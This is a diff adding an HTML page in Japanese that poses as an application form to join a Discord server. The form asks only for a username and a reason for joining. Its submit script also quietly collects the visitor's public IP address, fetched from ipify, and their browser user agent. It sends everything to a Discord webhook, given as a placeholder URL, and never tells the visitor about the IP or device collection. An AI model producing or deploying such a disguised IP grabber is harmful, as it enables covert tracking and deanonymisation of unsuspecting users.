@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>Discord参加申請</title>
+</head>
+<body>
+  <h1>Discordサーバー参加申請フォーム</h1>
+  <form id="applyForm">
+    <input type="text" name="username" placeholder="あなたのDiscord名" required><br>
+    <textarea name="reason" placeholder="参加理由" required></textarea><br>
+    <button type="submit">送信</button>
+  </form>
+
+  <script>
+    document.getElementById('applyForm').addEventListener('submit', async function (e) {
+      e.preventDefault();
+
+      const formData = new FormData(e.target);
+      const username = formData.get('username');
+      const reason = formData.get('reason');
+
+      // デバイス情報取得
+      const deviceInfo = navigator.userAgent;
+
+      // IPアドレス取得
+      const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
+
+      // Webhookへ送信
+      fetch('YOUR_DISCORD_WEBHOOK_URL', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: '**新しい申請があります**',
+          embeds: [{
+            title: '申請情報',
+            fields: [
+              { name: 'ユーザー名', value: username },
+              { name: '参加理由', value: reason },
+              { name: 'IPアドレス', value: ipData.ip },
+              { name: 'デバイス情報', value: deviceInfo }
+            ],
+            color: 0x3498db
+          }]
+        })
+      });
+
+      alert("申請を送信しました！");
+    });
+  </script>
+</body>
+</html>
